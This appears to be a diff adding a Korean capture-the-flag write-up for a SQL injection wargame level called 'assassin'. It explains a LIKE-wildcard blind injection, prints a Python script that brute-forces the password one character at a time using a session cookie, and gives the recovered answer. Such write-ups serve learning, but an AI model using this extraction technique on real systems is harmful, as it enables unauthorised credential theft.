@@ -1,0 +1,44 @@
+I"_<p>보아하니 %연산자를 이용한 공격이다.</p>
+
+<p>pw like ‘a%’ 를 하게될 경우 a로 시작하는 모든 값을 검색한다. 즉 참이 된다</p>
+
+<p>페이로드를 날려보면</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+ 
+ 
+ 
+<span class="n">key</span><span class="o">=</span><span class="s">""</span>
+<span class="n">site</span><span class="o">=</span><span class="s">""</span>
+<span class="n">header</span><span class="o">=</span><span class="p">{</span><span class="s">'Cookie'</span><span class="p">:</span><span class="s">'PHPSESSID=vj0mghpj5cs5n24hh6pr7r4ne6'</span><span class="p">}</span>
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">12</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span><span class="mi">91</span><span class="p">)):</span>
+                <span class="n">site</span><span class="o">=</span><span class="s">"http://los.sandbox.cash/chall/assassin_dbfabd99373ea659e58407bc1a8438c6.php?pw="</span>
+                <span class="n">site</span><span class="o">+=</span><span class="n">key</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s">"</span><span class="si">%</span><span class="s">"</span>
+                <span class="k">print</span> <span class="p">(</span><span class="n">site</span><span class="p">)</span>
+                <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">site</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
+                
+                <span class="k">if</span> <span class="s">"&lt;br&gt;&lt;h2&gt;Hello guest"</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+                        <span class="k">break</span>
+        <span class="n">key</span><span class="o">+=</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="k">print</span> <span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">key"</span><span class="o">+</span><span class="n">key</span><span class="o">+</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+                
+<span class="k">print</span> <span class="p">(</span><span class="s">"</span><span class="se">\n\n\n</span><span class="s">F</span><span class="se">\n</span><span class="s">Key is :"</span><span class="o">+</span><span class="n">key</span><span class="o">+</span><span class="s">" </span><span class="se">\n\n\n</span><span class="s">"</span><span class="p">)</span>
+
+
+</code></pre></div></div>
+
+<p>해보면</p>
+
+<p>90d2fe10</p>
+
+<p>이게 답이라고 한다.</p>
+
+<p>근데 아무리 해도 안나오는걸 보면 admin pw랑 겹치는 부분이 있는것 같다.</p>
+
+<p>그래서 9% 90% 이런식으로 다시 한번 해보았다.</p>
+
+<p>정답이었다.</p>
+
+<p>902EFD10</p>
+
+:ET
